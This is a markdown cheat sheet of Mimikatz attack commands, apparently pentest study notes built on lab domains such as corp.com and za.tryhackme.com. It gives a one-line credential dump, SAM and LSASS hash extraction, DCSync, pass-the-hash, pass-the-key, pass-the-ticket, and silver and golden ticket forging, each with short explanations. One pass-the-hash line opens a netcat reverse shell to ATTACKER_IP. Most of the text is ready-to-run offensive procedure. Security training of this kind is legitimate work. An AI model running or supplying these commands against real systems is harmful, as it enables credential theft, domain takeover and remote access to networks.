# Mimikatz
## oneliner

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::secrets" "lsadump::lsa /inject" "lsadump::lsa /patch" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit" > mimikatz_out.txt
```
```powershell
"privilege::debug" # Elevates the tool’s privileges by enabling the debug mode.

"sekurlsa::logonpasswords" # Dumps logon session information from the Local Security Authority Subsystem Service (LSASS) for all logged-in users.

"lsadump::secrets" # Extracts sensitive LSA (Local Security Authority) secrets stored on the system.

"lsadump::lsa /inject" and "lsadump::lsa /patch" # Dump LSA secrets using different techniques. The /inject method uses in-memory injection while /patch applies a patching method to bypass certain protections.

"token::elevate" # Elevate the process privileges further by impersonating or duplicating tokens.

"lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" # Targets the SAM (Security Accounts Manager) database (store local user accounts+password hashes). The command uses specified SYSTEM and SAM files (presumably copied to C:\TEMP) and outputs the data into files like sam.hiv, security.hiv, and system.hiv.

"lsadump::cache" # Dumps cached credentials from the system. Windows caches user credentials for offline logon, and this command retrieves those entries.

"sekurlsa::ekeys" # Extracts encryption keys used by LSASS. These keys can be critical for decrypting other protected data within the system.

"exit" # Closes the Mimikatz session once all the commands have been executed.
```
https://github.com/gentilkiwi/mimikatz
Windows post-exploitation tool. It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
`usr/share/windows-resources/mimikatz`
## The SAM (Security Account Manager) database
**SAM** is a database of stored (hashed) credentials (primarily local accounts).

The **SAM** is essentially a database that stores local user account information, including password hashes for user logons.

### Extracting NTLM hashes from SAM (Security Account Manager):
```
mimikatz # privilege::debug # engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account.
mimikatz # token::elevate
mimikatz # lsadump::sam   
```

## LSASS (Local Security Authority Subsystem)
**LSASS** is an active service managing authentication in real time, storing credentials for currently authenticated sessions in memory.

is a process in Windows that handles user authentication, password changes, and access token creation. LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator.

**LSASS** is a Windows process responsible for enforcing security policies, handling user authentication, and generating access tokens. It’s effectively the “brains” of Windows authentication, verifying user credentials during the logon process and retaining authentication material in memory.

Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.

```powershell
PS> Get-LocalUser # get local users to check if it is worth
```

### Extracting NTLM hashes from LSASS (Local Security Authority Subsystem Service)
extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.


```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords # to dump the credentials of all logged-on users with the Sekurlsa module.
mimikatz # sekurlsa::msv 
```
# Obtain credentials from DC (dcsync attack by impersonating a domain controller)
user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.
```
mimikatz # lsadump::dcsync /user:corp\Administrator

# pass-the-ticket
mimikatz # lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
# pass-the-hash
use the extracted hashes to perform a PtH attack
```
mimikatz # token::revert # reestablish our original token privileges

```
```bash
# equivalent of using `runas /netonly` but with a hash instead of a password

mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
#  overpass-the-hash / pass-the-key
- Pass-the-Key (PtK) attack is akin to pass-the-hash (PtH) but applied to Kerberos networks.
- When a user requests a Ticket Granting Ticket (TGT), they send a timestamp encrypted with an encryption key derived from their password.
	- The encryption algorithm used depends on the Windows version and Kerberos configuration, including DES, RC4, AES128, or AES256.
- With access to any of these encryption keys, an attacker can request a TGT without needing the actual password, thus performing PtK.
- **overpass-the-hash** (OPtH) is a specific variant where the RC4 key is equivalent to the NTLM hash of a user, enabling TGT requests if RC4 is enabled.


```powershell
# obtain the Kerberos encryption keys from memory
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
**PtK commands:**
```powershell
# RC4/AES128/AES256 hash:
mimikatz # sekurlsa::pth 
	/user:Administrator 
	/domain:za.tryhackme.com 
	/<(ntlm/rc4/aes128/aes256)_chose_one>:96...d8 
	/run:"powershell"
```

# pass-the-ticket
- Mimikatz can extract both Ticket Granting Tickets (TGTs) and Ticket Granting Service Tickets (TGSs) from the memory of the LSASS process.
- The process usually requires us to have SYSTEM privileges on the attacked machine
- Both the ticket and its corresponding session key are necessary for authentication purposes. If only the ticket is available without its corresponding session key, it cannot be used.
- TGTs are more valuable as they can be used to request access to any services the user is allowed to access.
- Extracting TGTs typically requires administrator credentials, while extracting TGSs can be done with a low-privileged account assigned to that service.

```powershell
# 1. STEAL TICKET 
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets             # show stored tickets
mimikatz # standard::base64 /output:true # switch output file to Base64
mimikatz # sekurlsa::tickets /export     # export tickets

# 2. LIST EXPORTED TICKETS
PS> dir *.kirbi

# 3. REUSE TICKET
# inject the tickets into the current session
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# 4. LIST CACHED TICKETS
mimikatz # kerberos::list
PS> klist

# 5. USE TICKET 
PS> .\PsExec.exe \\workstation456 powershell.exe
```

# Forge Silver Ticket
```powershell
mmikatz # 
	kerberos::golden 
	/sid:S-1-5-21-1987370270-658905905-1781884369 # domain SID
	/domain:corp.com # domain name
	/ptt # option, which allows us to inject the forged ticket into the memory of the machine we execute the command on
	/target:web04.corp.com # target where the SPN runs
	/service:http # SPN protocol
	/rc4:4d28cf5252d39971419580a51484ca09 # NTLM hash of the SPN
	/user:jeffadmin # existing domain user who will be set in the forged ticket
```
From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above.
# Forge golden-ticket on windows
```powershell
mmikatz # 
	kerberos::golden # create golden-ticket
	/user:jen # user existing in AD database
	/domain:corp.com # domain name
	/sid:S-1-5-21-1987370270-658905905-1781884369 # domain SID 
	/krbtgt:1693c6cefafffc7af11ef34d1c788f47 # password hash of the krbtgt user account
	/ptt # inject forged ticket to memory
```
Starting July 2022, Microsoft improved the [authentication process](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041), so we'll need to provide an existing account. Let's set the golden-ticket's username to **jen**. Before it didn't matter if the account existed
```powershell
# EXAMPLE + RID, GID explained

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

golden-ticket for 'jen @ corp.com' successfully submitted for current session
# Mimikatz provides two sets of default values when using the golden-ticket option: the user ID and the groups ID. 
#The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain. 
# The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
```